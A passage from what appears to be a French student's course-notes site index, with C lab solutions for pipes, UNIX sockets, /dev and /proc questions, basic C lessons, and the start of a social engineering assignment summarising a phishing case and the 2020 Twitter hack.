lira toutes les valeurs pr\u00e9sentes dans le tube, et affichera la moyenne des valeurs avant de quitter.","text":"<p>send.c :  <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;fcntl.h&gt;\n#include &lt;sys/stat.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;time.h&gt;\n#include &lt;string.h&gt;\n\nint main(int argc, char *argv[]) {\n    /* V\u00e9rification arguments : send_rand &lt;nom&gt; -n &lt;nombre&gt; */\n    if (argc &lt; 4 || strcmp(argv[2], \"-n\") != 0) {\n        printf(\"Usage: %s &lt;tube&gt; -n &lt;nombre&gt;\\n\", argv[0]);\n        return 1;\n    }\n\n    /* Construction du chemin dans /tmp */\n    char path[256];\n    snprintf(path, sizeof(path), \"/tmp/%s\", argv[1]);\n\n    /* Cr\u00e9ation du tube (ignorer erreur si existe d\u00e9j\u00e0) */\n    mkfifo(path, 0666);\n\n    printf(\"Ouverture du tube %s (en attente d'un lecteur)...\\n\", path);\n    /* O_WRONLY bloque jusqu'\u00e0 ce qu'un lecteur ouvre le tube */\n    int fd = open(path, O_WRONLY);\n    if (fd == -1) return 1;\n\n    int n = atoi(argv[3]);\n    srand(time(NULL));\n\n    printf(\"Envoi de %d valeurs...\\n\", n);\n    for (int i = 0; i &lt; n; i++) {\n        int val = rand() % 100;\n        write(fd, &amp;val, sizeof(int));\n    }\n\n    close(fd);\n    return 0;\n}\n</code></pre> get.c : <pre><code>#include &lt;stdio.h&gt;\n#include &lt;fcntl.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;string.h&gt;\n\nint main(int argc, char *argv[]) {\n    if (argc &lt; 2) {\n        printf(\"Usage: %s &lt;tube&gt;\\n\", argv[0]);\n        return 1;\n    }\n\n    char path[256];\n    snprintf(path, sizeof(path), \"/tmp/%s\", argv[1]);\n\n    printf(\"Attente de donn\u00e9es sur %s...\\n\", path);\n    int fd = open(path, O_RDONLY);\n    if (fd == -1) {\n        perror(\"Erreur ouverture (lancez send_rand d'abord ?)\");\n        return 1;\n    }\n\n    int val, count = 0;\n    long sum = 0;\n\n    /* Lecture tant qu'il y a des donn\u00e9es (EOF = 0) */\n    while (read(fd, &amp;val, sizeof(int)) &gt; 0) {\n        sum += val;\n        count++;\n    }\n\n    if (count &gt; 0) {\n        printf(\"Re\u00e7u %d valeurs.\\n\", count);\n        printf(\"Moyenne : %.2f\\n\", (float)sum / count);\n    } else {\n        printf(\"Aucune donn\u00e9e re\u00e7ue.\\n\");\n    }\n\n    close(fd);\n    /* Optionnel : supprimer le tube apr\u00e8s usage */\n    unlink(path);\n    return 0;\n}\n</code></pre> </p>"},{"location":"cours-TP/C_Systems/tpc/tpc/#4socket","title":"4.Socket","text":""},{"location":"cours-TP/C_Systems/tpc/tpc/#4aen-utilisant-les-sockets-unix-vous-devez-ecrire-un-programme-client-et-un-serveur-le-client-enverra-une-valeur-numerique-unique-au-serveur-via-les-sockets-unix-ce-client-sera-execute-simultanement-2-fois-chacun-des-processus-contactera-le-meme-serveur-et-chacun-devra-envoyer-une-valeur-aleatoire-au-serveur-via-les-sockets-le-processus-serveur-attendra-davoir-deux-valeurs-numeriques-il-devra-alors-calculer-la-somme-des-deux-valeurs-lafficher","title":"4a)En utilisant les sockets UNIX, vous devez \u00e9crire un programme client et un serveur. Le client enverra une valeur num\u00e9rique unique au serveur via les sockets UNIX. Ce client sera ex\u00e9cut\u00e9 simultan\u00e9ment 2 fois. Chacun des processus contactera le m\u00eame serveur et chacun devra envoyer une valeur al\u00e9atoire au serveur via les sockets. Le processus serveur attendra d\u2019avoir deux valeurs num\u00e9riques. Il devra alors calculer la somme des deux valeurs, l\u2019afficher","text":"<p>On doit envoyer au serveur via le client un chiffre al\u00e9atoire et le serveur doit l'afficher dans la console puis en renvoyer une autre via le client en ensuite faire la somme des deux et l'afficher sur le serveur.</p> <p>server.c :  <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/socket.h&gt;\n#include &lt;sys/un.h&gt;\n#include &lt;string.h&gt;\n\nint main(int argc, char *argv[]) {\n    if (argc &lt; 2) { printf(\"Usage: %s &lt;socket_path&gt;\\n\", argv[0]); return 1; }\n\n    int sock = socket(PF_LOCAL, SOCK_STREAM, 0);\n    struct sockaddr_un addr = { .sun_family = AF_LOCAL };\n    strncpy(addr.sun_path, argv[1], sizeof(addr.sun_path) - 1);\n\n    unlink(argv[1]); \n    if (bind(sock, (struct sockaddr*)&amp;addr, sizeof(addr)) == -1) { perror(\"bind\"); return 1; }\n    listen(sock, 5);\n\n    printf(\"[SERVEUR] En attente de 2 valeurs...\\n\");\n\n    int sum = 0;\n    for (int i = 0; i &lt; 2; i++) {\n        int client = accept(sock, NULL, NULL);\n        if (client == -1) continue;\n\n        int val = 0;\n        if (read(client, &amp;val, sizeof(int)) &gt; 0) {\n            printf(\"  -&gt; Re\u00e7u valeur %d du client %d\\n\", val, i+1);\n            sum += val;\n        }\n        close(client);\n    }\n\n    printf(\"[SERVEUR] Somme totale : %d\\n\", sum);\n\n    close(sock);\n    unlink(argv[1]);\n    return 0;\n}\n</code></pre>  client.c :  <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/socket.h&gt;\n#include &lt;sys/un.h&gt;\n#include &lt;string.h&gt;\n#include &lt;time.h&gt;\n\nint main(int argc, char *argv[]) {\n    if (argc &lt; 2) { printf(\"Usage: %s &lt;socket_path&gt;\\n\", argv[0]); return 1; }\n\n    int sock = socket(PF_LOCAL, SOCK_STREAM, 0);\n    struct sockaddr_un addr = { .sun_family = AF_LOCAL };\n    strncpy(addr.sun_path, argv[1], sizeof(addr.sun_path) - 1);\n\n    if (connect(sock, (struct sockaddr*)&amp;addr, sizeof(addr)) == -1) {\n        perror(\"connect\"); return 1;\n    }\n\n    /* G\u00e9n\u00e9ration al\u00e9atoire (bas\u00e9e sur le PID pour varier entre processus simultan\u00e9s) */\n    srand(time(NULL) ^ getpid());\n    int val = rand() % 100;\n\n    printf(\"[CLIENT %d] Envoi de %d\\n\", getpid(), val);\n    write(sock, &amp;val, sizeof(int));\n\n    close(sock);\n    return 0;\n}\n</code></pre> </p> <p>On a donc ici sur le serveur la somme de 6 + 31 deux nombres al\u00e9atoires envoy\u00e9 par le client sur le socket \"eheh\"</p>"},{"location":"cours-TP/C_Systems/tpd/tpd/","title":"TPD-Les fichiers et p\u00e9riph\u00e9riques","text":""},{"location":"cours-TP/C_Systems/tpd/tpd/#1-les-peripheriques","title":"1. Les p\u00e9riph\u00e9riques","text":""},{"location":"cours-TP/C_Systems/tpd/tpd/#1a-quoi-correspondent-ces-peripheriques","title":"1a) quoi correspondent ces p\u00e9riph\u00e9riques ?","text":"<pre><code>/dev/null = tout ce qui est \u00e9crit dedans est \u00e9ffac\u00e9 c'est une corbeille\n\n/dev/zero = source infini d'octet 0\n\n/dev/random = g\u00e9n\u00e9rateur de nombre al\u00e9atoire\n\n/dev/urandom = autre g\u00e9n\u00e9rateur de nombre al\u00e9atoire\n\n/dev/loop0 = p\u00e9riph\u00e9rique de boucle\n</code></pre>"},{"location":"cours-TP/C_Systems/tpd/tpd/#1ben-utilisant-les-fonctions-open-man-3-open-et-read-man-3-read-ecrivez-un-programme-qui-affiche-un-nombre-aleatoire-sur-un-int","title":"1b)En utilisant les fonctions open (man 3 open ) et read (man 3 read), \u00e9crivez un programme qui affiche un nombre al\u00e9atoire sur un int.","text":"<p>Programme qui affiche un nombre al\u00e9atoire avec /dev/urandom : <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;fcntl.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;errno.h&gt;\n\nint main() {\n    int random_int;\n    int fd;\n    // open le fichier p\u00e9riph\u00e9rique\n    fd = open(\"/dev/urandom\", O_RDONLY);\n    if (fd == -1) {\n        perror(\"Erreur lors de l'ouverture de /dev/urandom\");\n        return EXIT_FAILURE;\n    }\n    // read la taille d'un entier (sizeof(int))\n    // On passe l'adresse de notre variable pour que read la remplisse\n    ssize_t bytes_read = read(fd, &amp;random_int, sizeof(int));\n    // Affichage du r\u00e9sultat\n    printf(\"Nombre al\u00e9atoire lu : %d\\n\", random_int);\n    close(fd);\n\n    return EXIT_SUCCESS;\n}\n</code></pre></p>"},{"location":"cours-TP/C_Systems/tpd/tpd/#3-le-systeme-de-fichiers-proc","title":"3. Le syst\u00e8me de fichiers /proc","text":""},{"location":"cours-TP/C_Systems/tpd/tpd/#3a-a-quoi-correspondent-les-repertoires-nommes-par-des-numeros","title":"3a)  A quoi correspondent les r\u00e9pertoires nomm\u00e9s par des num\u00e9ros ?","text":"<p>Correspond au proc\u00e9ssus en cours d'utilisation avec le PID correspondant </p>"},{"location":"cours-TP/C_Systems/tpd/tpd/#3b-a-quoi-correspond-le-fichier-cmdline-a-linterieur-dun-de-ces-repertoires","title":"3b) A quoi correspond le fichier cmdline \u00e0 l'int\u00e9rieur d'un de ces r\u00e9pertoires ?","text":"<p>Contient la ligne de commande utilis\u00e9 pour lancer le processus </p>"},{"location":"cours-TP/C_Systems/tpd/tpd/#3c-a-quoi-correspond-le-fichier-cwd-a-linterieur-dun-de-ces-repertoires","title":"3c) A quoi correspond le fichier cwd \u00e0 l'int\u00e9rieur d'un de ces r\u00e9pertoires ?","text":"<p>Current Working Directory  :pointe vers le repertoir courant du processus </p>"},{"location":"cours-TP/C_Systems/tpd/tpd/#3d-a-quoi-correspond-le-fichier-exe-a-linterieur-dun-de-ces-repertoires","title":"3d) A quoi correspond le fichier exe \u00e0 l'int\u00e9rieur d'un de ces r\u00e9pertoires ?","text":"<p>Le fichier binaire qui execute le processus </p>"},{"location":"cours-TP/C_Systems/tpd/tpd/#3e-que-contient-le-fichier-procdevices","title":"3e) Que contient le fichier /proc/devices ?","text":"<p>Liste des pilotes graphiques actuellement charg\u00e9s.</p>"},{"location":"cours-TP/C_Systems/tpd/tpd/#3f-que-pouvez-vous-dire-du-repertoire-procself","title":"3f) Que pouvez vous dire du r\u00e9pertoire /proc/self ?","text":"<p>Un lien symbolique pointant vers le repertoire du processus qui est en train d'y acceder.</p>"},{"location":"cours-TP/Language/C/base_du_c/","title":"Cours de c :","text":""},{"location":"cours-TP/Language/C/base_du_c/#base","title":"Base :","text":""},{"location":"cours-TP/Language/C/base_du_c/#comment-compiler","title":"Comment Compiler ?","text":"<p>On va utiliser gcc : <pre><code>gcc \"nom_du_fichier.c\" //cela va renvoie un \"a.out\" c-a-d un executable \n//---Pour nommer l'executable---\n\ngcc \"nom_du_fichier.c\" -o \"nom_de_lexecutable\" // -o permet de nommer l'output.\n</code></pre></p>"},{"location":"cours-TP/Language/C/base_du_c/#prinft-variables","title":"Prinft + Variables :","text":"<p>La fonction printf permet d'afficher dans la console. Appel\u00e9e dans printf :  <pre><code>Entier : printf(\"Entier %d \\n\", entier);\nFloat : printf(\"Flottant %.2f \\n\", flottant);\nChar : printf(\"caract\u00e8re %c\\n\", caractere);\n</code></pre> Entier = %d Float = %f pour les nombres \u00e0 virgules : %.2f Char = %c Str = %s longueur = %lu pointeur = %p</p> <p>Code montrant comment utiliser des variables : <pre><code>#include &lt;stdio.h&gt;\n\nint main(void)\n{\n    //Initialisation des trois variables\n    int entier = 10;\n    float flottant =10.15;\n    char caractere = 'A';\n\n    printf(\"Entier %d \\n\", entier); // appel des trois variables avec printf\n    printf(\"Flottant %.2f \\n\", flottant);\n    printf(\"caract\u00e8re %c\\n\", caractere);\n\n    printf(\"Entier : %d, Flottant : %.2f , Char : %c \\n\", entier,flottant,caractere);\n}\n</code></pre></p>"},{"location":"cours-TP/Language/C/base_du_c/#scanf","title":"Scanf :","text":"<p>La fonction Scanf permet de lire lire des donn\u00e9es format\u00e9es \u00e0 partir d'une entr\u00e9e </p> <p>Exemple d'utilisation : <pre><code>#include &lt;stdio.h&gt;\n\nint main(void){\n\n    int nombre; //initialisation de la variable nombre\n    printf(\"Entrez un nombre :\");//affiche sur la console \"entrez un nombre\"\n    scanf(\"%d\",&amp;nombre);// utilisation de la fonction scanf sur l'adresse m\u00e9moire de nombre\n                        // on r\u00e9cup\u00e8re ce que l'utilisateur a \u00e9crit apr\u00e8s \"entrez un nombre\"\n    printf(\"Nombre =%d\\n\", nombre); // Puis affichage de ce dernier\n    return 0;\n}\n</code></pre></p> <p>Ce que cela renvoie : </p>"},{"location":"cours-TP/Language/C/base_du_c/#exercice-simple","title":"Exercice Simple :","text":"<p>Cr\u00e9e un programme C qui demande une temp\u00e9rature en Celsius et la convertie gr\u00e2ce \u00e0 la formule Celsius x 1.8 + 32</p>"},{"location":"cours-TP/Language/C/base_du_c/#resolution","title":"R\u00e9solution :","text":"<pre><code>#include &lt;stdio.h&gt;\n\nint main(void){\n    float temperature_celcius; //temperature choisis a convertir\n    float temperature_fahrenheit; //resultat pour apr\u00e8s\n    printf(\"Entrez la temp\u00e9rature que vous voulez convertir en fahrenheit : \");\n    scanf(\"%f\",&amp;temperature_celcius); //on recupere la valeur choisis\n    printf(\"Vous avez choisis : %.2f \\n\", temperature_celcius); // on l'affiche\n    temperature_fahrenheit = (temperature_celcius * 1.8 ) + 32 ; //on fait le calcul de conversion (C *1.8)+32\n    printf(\"Cela donne %.2f \\n\",temperature_fahrenheit);// On l'affiche\n}\n</code></pre>"},{"location":"cours-TP/Language/C/base_du_c/#arithmetique","title":"Arithmetique :","text":"<p>On va maintenant voir les diff\u00e9rents calculs possibles les basiques :      1. Somme     2. Difference     3. Produit     4. Quotient     5. Modulo</p> <p>A travers ce code vous trouverez des exemples de chacuns des 5 calculs :</p> <pre><code>#include &lt;stdio.h&gt;\n\nint main(void){\n    int a = 10, b = 5; //mani\u00e8re rapide d'assigner des valeurs \u00e0 plusieurs variables du m\u00eame types\n\n    int somme = a + b;\n    int difference = a - b;\n    int produit = a * b;\n    float quotient = a / b;\n    int modulo = a % 3; //reste de la division (ex : 5 % 3 = 2)\n\n    printf(\"%d\\n\",somme);\n    printf(\"%d\\n\",difference);\n    printf(\"%d\\n\",produit);\n    printf(\"%.2f\\n\",quotient);\n    printf(\"%d\\n\",modulo);\n\n    return 0;\n}\n</code></pre>"},{"location":"cours-TP/Language/C/base_du_c/#les-conditions","title":"Les conditions :","text":""},{"location":"cours-TP/Language/C/base_du_c/#le-if-si","title":"Le IF (SI) :","text":"<p>Voici un code explicaiton l'utilision d'un IF, ELSE IF, ELSE En commentaire au dessus de la fonction main, il y a une explications des comparateurs.</p> <pre><code>#include &lt;stdio.h&gt;\n\n\nint main(void){\n    // types de compateur : \n    /* \n    les retours : 1 = True et 0 = False\n    1. Le \"==\"  si l'affirmation est vrai. Exemple : 5 == 3; va retourner 0 car 5 est differents de 3.\n    2. le \"!=\" signifie \"diff\u00e9rent de\". Exemple : 5 != 3; va retoruner 1 car 5 est different der 3\n    3. le \" &lt; \" plus petit que ou \"&gt;\" plus grand que. Exemple : 5 &lt; 3; va retoruner 0 car 5 est plus grand que 3\n    4. le \"&lt;=\" ou \"&gt;=\" m\u00eame principe mais on inclus le 3 sup\u00e9rieur ou \u00e9gal / inf\u00e9rieur ou \u00e9gal.\n    */\n    int nombre;\n    printf(\"Choisir un nombre : \");\n    scanf(\"%d\", &amp;nombre);\n\n    // on veut print savoir si le nombre est positif / n\u00e9gatif ou \u00e9gal \u00e0 0\n\n    if (nombre &gt; 0 ){ //si le nombre est sup\u00e9rieur \u00e0 0 \n        printf(\"Le nombre est positif \\n\");\n    }\n    else if (nombre &lt; 0){//si le nombre est inf\u00e9rieur \u00e0 0 \n        printf(\"le nombre est n\u00e9gatif \\n\");\n    }\n    else { //si il est ni sup\u00e9rieur ni inf\u00e9rieur alors c'est 0\n        printf(\"Le nombre est z\u00e9ro \\n\");\n    }\n\n\n    return 0;\n}\n</code></pre>"},{"location":"cours-TP/Language/C/base_du_c/#le-et-logique","title":"Le ET LOGIQUE :","text":"<p>Le ET logique (&amp;&amp;) retourne vrai que si les deux conditions sont juste.</p> <p>Il s'\u00e9crit de la sorte : </p> <p><code>printf(\"%d\\n\", 1 == 1  &amp;&amp; 0 == 1);</code> Cela va retourner 0 donc FALSE</p>"},{"location":"cours-TP/Language/C/base_du_c/#le-ou-logique","title":"Le OU logique","text":"<p>Le OU LOGIQUE (||) retorune vrai si une ou l'autre conditions est juste (ou les deux)</p> <p>Il s'\u00e9crit de la sorte : </p> <p><code>printf(\"%d\\n, 1 == 1 || 0 == 1);</code> Cela va retourner 1(True) car une condition est juste (1 == 1).</p>"},{"location":"cours-TP/Language/C/base_du_c/#a-savoir","title":"A savoir :","text":"<p>La priorit\u00e9 est la suivante : Le OU est prioritaire au ET. Donc si il y a un OU et un ET alors le OU sera prioritaire. (Explication exo en dessous).</p>"},{"location":"cours-TP/Language/C/base_du_c/#exercice","title":"Exercice :","text":"<p>Il faut cr\u00e9e un programme qui determine si une ann\u00e9e est bisextile ou non</p>"},{"location":"cours-TP/Language/C/base_du_c/#resolution-dexercice","title":"R\u00e9solution d'exercice :","text":"<pre><code>#include &lt;stdio.h&gt;\n\nint main(void){\n\n    int annee;\n    printf(\"Donnez une ann\u00e9e pour savoir si elle est bissextile : \");\n    scanf(\"%d\",&amp;annee);\n    /*\n    Une ann\u00e9e bisextile doit r\u00e9unir 3 condtions :\n    1. Divisible par 4.\n    2. Pas divisible par 100.\n    3. Sauf si divisible par 400.\n    Si divisible par 400 alors la r\u00e8gle 2 n'est pas prise en compte\n    */\n    if (annee % 4 == 0 &amp;&amp; annee % 100 != 0 || annee % 400 == 0){\n        printf(\"L'ann\u00e9e %d est bissextile\\n\",annee);\n    }\n    else{\n        printf(\"L'ann\u00e9e %d est pas bissextile\\n\",annee);\n    }\n}\n</code></pre>"},{"location":"cours-TP/Language/C/base_du_c/#les-boucles","title":"Les Boucles :","text":""},{"location":"cours-TP/Language/C/base_du_c/#while","title":"While","text":"<p><pre><code>#include &lt;stdio.h&gt;\n\nint main(void){\n    /*\n    Boucle WHILE (tant que) :\n    On veut faire un boucle qui affiche un chiffre 5 fois jusqu'\u00e0 que i = 5\n    On doit l'incr\u00e9menter a chaque passage\n    */\n    int i = 0;\n    while(i &lt; 5){ // tant que i est inf\u00e9rieur a 5\n        printf(\"%d\\n\",i);\n        i = i+1;//increment de i\n    }\n    return 0;\n}\n</code></pre> Lorsque on lance le programme : </p>"},{"location":"cours-TP/Language/C/base_du_c/#do-while","title":"Do While :","text":"<p><pre><code>#include &lt;stdio.h&gt;\n\nint main(void){\n\n    /*\n    Boucle DO WHILE (Fais ... tant que ... ) :\n    M\u00eame principe sauf que l'on fait quelque chose avant de lancer la boucle\n    Exemple ici si i est &gt; a 5 alors il va pas afficher 0,1,2,3,4\n    mais simplement le i puis fermer le programme \n    */\n    int i = 10;\n    do {\n        printf(\"%d\\n\", i);\n        i = i+1;\n    } while ( i &lt; 5);\n    return 0;\n\n}\n</code></pre> </p>"},{"location":"cours-TP/Language/C/base_du_c/#for","title":"FOR :","text":"<p>Programe simple expliquant la boucle FOR de mani\u00e8re la plus triviale possible :</p> <p><pre><code>#include &lt;stdio.h&gt;\n\nint main(void){\n\n    /*\n    Boucle FOR (Pour ...)\n    Se construit de cette mani\u00e8re : for(variable ; condition ; incr\u00e9mentation)\n    */\n    for (int i = 0; i &lt; 5 ; i++)\n    {\n        printf(\"%d\\n\", i);\n    }\n}\n</code></pre> </p> <p>Autre exemple : </p> <pre><code>#include &lt;stdio.h&gt;\n\n/*\nOn veut demander un nombre puis parcourir de 0 \u00e0 ce nombre pour ajouter chaque nombre qu'il poss\u00e8e et en faire la somme \nexemple 5 : 0+1+2+3+4+5 = 15\n*/\n\nint main(void)\n{\n    int nombre;\n    int somme = 0;\n    printf(\"Choisir un nombre : \");\n    scanf(\"%d\",&amp;nombre);\n\n    for (int i = 0; i &lt;= nombre ; i++){ // pour i = 0 ; tant qu'il est pas = a 5 ; i +1\n        somme += i; // on ajoute i \u00e0 la somme\n    }\n    printf(\"%d est la somme de tout les nombres de %d\\n\",somme,nombre);\n    return 0;\n}\n</code></pre>"},{"location":"cours-TP/Language/C/base_du_c/#exercice_1","title":"Exercice","text":"<p>Ecrire le r\u00e9sultat d'un terme donn\u00e9 par l'user avec la suite de fibonnaci exemple rang 5 de fibonnaci = 8 Fibonnaci : addition des deux derniers termes 0 + 1 + 1 + 2 + 3</p> <p>Donn\u00e9e connu :  Terme 1 = 0 Terme 2 = 1</p>"},{"location":"cours-TP/Language/C/base_du_c/#resolution_1","title":"R\u00e9solution :","text":"<pre><code>int main(void){\n    /*\n    Suite de fibonnaci :\n    On doit ajouter les deux dernier termes de la suite avec le nombre de terme\n    */\n   int fib1 = 0; //terme 1 de fibnonnaci\n   int fib2 = 1; //temre 2 de fibonncaci\n   int terme;\n   int somme = 0;\n    printf(\"Combien de termes voulez vous affichez\");\n    scanf(\"%d\",&amp;terme);\n\n    for (int i = 0 ; i &lt; terme ; i++){ // on parcours jusqu'au terme demand\u00e9\n        somme = fib1 + fib2; //somme sera le r\u00e9sultat final on additionne terme -2 et terme -1\n        fib1 = fib2; // on remplace terme -2 par terme -1\n        fib2 = somme; // on remplace terme -1  par resultat terme\n    }\n    printf(\"Le rang %d de la suite de fibonacci est %d \\n\",terme,somme);\n\n    return 0;\n}\n</code></pre>"},{"location":"cours-TP/Language/C/base_du_c/#les-fonctions","title":"Les Fonctions :","text":"<p>La base des fonctions :  On va cr\u00e9e une fonction qui permet d'additonner : </p> <pre><code>#include &lt;stdio.h&gt;\n\nint addition(int a, int b){ // fonction avec paremetre deux entier a et b\n    return a + b; // l'addition basique\n}\n\n\n\nint main(void){\n    int somme = addition(5,35);// on appelle la fonction addition dans la variable somme pour que 5 et 35 s'additionne \n    // donc a = 5 et b = 35\n    printf(\"La somme est %d\\n\",somme);\n    return 0;\n}\n</code></pre>"},{"location":"cours-TP/Language/C/base_du_c/#les-tableaux","title":"Les tableaux :","text":"<p>Cr\u00e9e un tableau puis l'afficher :  Syntaxe : tableau[LongTableau] = {1,2,3,4,5,6};</p> <pre><code>#include &lt;stdio.h&gt;\n\nint main(void){\n\n    float notes[] = {15.5,9.7,18,1.3};// on peut faire notes[4] pour dire qu'il y a quatre \u00e9l\u00e9ments \n\n    for (int i = 0 ; i &lt; 4 ; i++){ // on boucle sur le tableau pour afficher chaque note\n        printf(\"La note est : %2f\\n\",notes[i]); // on affiche le rang (i) \u00e0 chaque appel\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"cours-TP/Language/C/base_du_c/#les-tableaux-a-doubles-entrees","title":"Les Tableaux a doubles entr\u00e9es :","text":"<pre><code>#include &lt;stdio.h&gt;\n\nint main(void)\n{\n\n    int tableau[2][3] = {{1,2,3},{4,5,6}}; // tableau multi dimensions\n    for (int i = 0; i &lt; 2 ; i++)// on parcours le premier tableau (de 2)\n    { \n        for (int j = 0; j&lt; 3 ; j++) // on parcours le deuxieme tableau (de 3)\n        {\n            printf(\"%d\" , tableau[i][j]);\n        }\n        printf(\"\\n\");\n    }\n    return 0;\n}\n</code></pre>"},{"location":"cours-TP/Language/C/base_du_c/#les-chaines-de-caracteres","title":"Les chaines de caract\u00e8res :","text":"<pre><code>#include &lt;stdio.h&gt;\n\nint main(void)\n{\n    //Pour initialiser une chaines de charact\u00e8res : \n    char prenom[32]; // prenom[32] est la variable str, 32 est le nb de charact\u00e8res allou\u00e9 max.\n    printf(\"Entrez votre pr\u00e9nom : \");\n    scanf(\"%s\",prenom); //pas besoin de pointeur car prenom point vers une adresse m\u00e9moire car un tableau sans {} est un pointeur vers la premi\u00e8re case du tableau\n    printf(\"Bonjour, %s \\n\",prenom);\n    return 0;\n}\n</code></pre> <p>fonction internes au strings :      - longueur d'un mot : strlen() : changer le %s en %lu</p>"},{"location":"cours-TP/Language/C/base_du_c/#les-pointeurs","title":"Les Pointeurs :","text":"<pre><code>#include &lt;stdio.h&gt;\n\n\nvoid add_one (int *number)// ICI * signifie l'adresse de la variable number \n{\n    printf(\"Adresse de numbre %p\\n\", number);\n    *number = *number + 1; // on modifier la valeur de l'entier stocker \u00e0 l'adresse \n}\n\n\n\nint main(void)\n{\n\n    int value = 42;\n\n    printf(\"Value : %d \\n\", value);\n    printf(\"Adresse de value : %p \\n\", &amp;value);\n\n    add_one(&amp;value); // on appelle la fonction sur value mais avec le pointeur pour modifier la variable\n\n    printf(\"Value : %d\\n\", value);\n    return 0;\n}\n</code></pre>"},{"location":"cours-TP/Language/C/base_du_c/#les-structures","title":"Les Structures :","text":""},{"location":"cours-TP/Language/C/base_du_c/#exemple","title":"Exemple :","text":"<pre><code>#include &lt;stdio.h&gt;\n\n\nstruct Student {\n    char prenom[50];\n    int age;\n    float notes[10];\n};\n\n\n\nint main()\n{\n    struct Student s1;\n    printf(\"Entrez un pr\u00e9nom : \");\n    scanf(\"%s\", s1.prenom);\n\n\n    printf(\"Entrez un age : \");\n    scanf(\"%d\", &amp;s1.age);\n\n    printf(\"Pr\u00e9nom : %s\\n\", s1.prenom);\n    printf(\"Age : %d \\n\",s1.age);\n\n    return 0;\n}\n</code></pre>"},{"location":"cours-TP/Language/C/base_du_c/#exercice_2","title":"Exercice","text":"<p>Exercice sur la structure, les pointeurs, les tableaux, le scanf etc</p> <p>Il faut cr\u00e9e une liste de contact avec nom prenom et num\u00e9ro de telephone Puis afficher la liste de contact : </p> <pre><code>#include &lt;stdio.h&gt;\n\n/*\nCr\u00e9ation d'une structure contact avec pr\u00e9nom num\u00e9ro et age\n*/\nstruct Contact \n    {\n        char prenom[30];\n        char numero[10];\n        int age;\n    };\n\nint main(void){\n    struct Contact contacts[2]; // on initialise le tableau de 2 contacts via la structure\n    for (int i = 0; i &lt; 2 ; i++){ // on parcours le tableau pour le remplir\n        printf(\"Entrez un pr\u00e9nom\");\n        scanf(\"%s\", contacts[i].prenom);\n\n        printf(\"Entrez un age\");\n        scanf(\"%d\", &amp;contacts[i].age);// on pointe seulement pour le int ici avec &amp;\n\n        printf(\"Entrez un num\u00e9ro\");\n        scanf(\"%s\", contacts[i].numero);\n\n\n    } printf(\"\\n Liste de contact : \"); //maintenant on veut afficher la liste de contact\n    for (int i = 0 ; i &lt; 2 ; i++)//on reparcours les contacts\n    {\n        printf(\"Contact num\u00e9ro : %d\\n\", i + 1 );\n        printf(\"Pr\u00e9nom : %s\\n\", contacts[i].prenom);//on affiche le prenom en parcours le tableau \u00e0 l'indice i\n        printf(\"age : %d\\n\", contacts[i].age);//pareil\n        printf(\"num\u00e9ro : %s\\n\", contacts[i].numero); // pareil\n    }\n\n\n    return 0;\n}\n</code></pre>"},{"location":"cours-TP/Language/C/base_du_c/#resultat","title":"R\u00e9sultat","text":""},{"location":"cours-TP/cybersecurite/TD_Social_Engineering/","title":"TD1 - L'ing\u00e9nierie sociale (social engineering)","text":"<p>Exercice 1 : Recherche d\u2019exemple d\u2019ing\u00e9nierie sociale</p> <p>L'ing\u00e9nierie sociale dans le domaine de la s\u00e9curit\u00e9 de l'information, est utilis\u00e9e pour d\u00e9crire les techniques utilis\u00e9es par une personne (ou des personnes) qui manipulent des personnes afin d'acc\u00e9der \u00e0 des informations sur une organisation ou ses syst\u00e8mes informatiques. Un ing\u00e9nieur social est g\u00e9n\u00e9ralement difficile \u00e0 identifier et peut pr\u00e9tendre \u00eatre un nouvel employ\u00e9, un r\u00e9parateur ou chercheur. L'ing\u00e9nieur social pourrait m\u00eame offrir des informations d'identification pour soutenir cette identit\u00e9. Par gagner la confiance et poser des questions, il ou elle peut \u00eatre en mesure de rassembler suffisamment d'informations pour infiltrer un r\u00e9seau de l'organisation.</p> <p>Rechercher des incidents d'ing\u00e9nierie sociale. R\u00e9sum\u00e9 des trois exemples trouv\u00e9s dans vos recherches.</p>"},{"location":"cours-TP/cybersecurite/TD_Social_Engineering/#1-mail-phishing-de-perrine","title":"1. Mail-Phishing de Perrine","text":"<p>Perrine , une internaute, re\u00e7oit un mail de Mondial Relay informant que son colis n\u2019as pas pu \u00eatre livr\u00e9, et lui propose de choisir un autre mode de retrait. Cependant, cette derni\u00e8re n\u2019a pas command\u00e9 de colis. Ceci est donc un mail de phishing. De plus le mail avait toutes les formes d\u2019un mail officiel. </p> <p>Source : https://www.quechoisir.org/actualite-arnaque-a-la-fausse-livraison-du-phishing-plus-vrai-que-nature-n149516 </p>"},{"location":"cours-TP/cybersecurite/TD_Social_Engineering/#2-le-piratage-de-twitter-2020","title":"2. Le piratage de Twitter (2020)","text":""},{"location":"cours-TP/cybersecurite/TD_Social_Engineering/#contexte","title":"Contexte :","text":"<p>En juillet 2020, Twitter a subi une attaque majeure d'ing\u00e9nierie sociale ayant entra\u00een\u00e9 le piratage de plus de 130 comptes de personnalit\u00e9s publiques, d\u2019hommes politiques et d\u2019entreprises.</p>"},{"location":"cours-TP/cybersecurite/TD_Social_Engineering/#deroulement-de-lattaque-schema-en-etapes","title":"D\u00e9roulement de l\u2019attaque (sch\u00e9ma en \u00e9tapes) :","text":"<ol> <li> <p>Phase de reconnaissance : Les attaquants collectent des informations sur le fonctionnement interne de Twitter, notamment sur son support technique.</p> </li> <li> <p>Phase de contact : Ils appellent des employ\u00e9s en se faisant passer pour des membres du service informatique, utilisant un vocabulaire technique cr\u00e9dible.</p> </li> <li> <p>Phase de manipulation : Les victimes sont convaincues de divulguer leurs identifiants internes (acc\u00e8s au panneau d\u2019administration de Twitter).</p> </li> <li> <p>Phase d\u2019exploitation : Une fois connect\u00e9s, les attaquants modifient les adresses e-mail associ\u00e9es aux comptes cibl\u00e9s.</p> </li> <li> <p>Phase d\u2019attaque finale : Ils publient un faux message promettant de doubler les bitcoins envoy\u00e9s 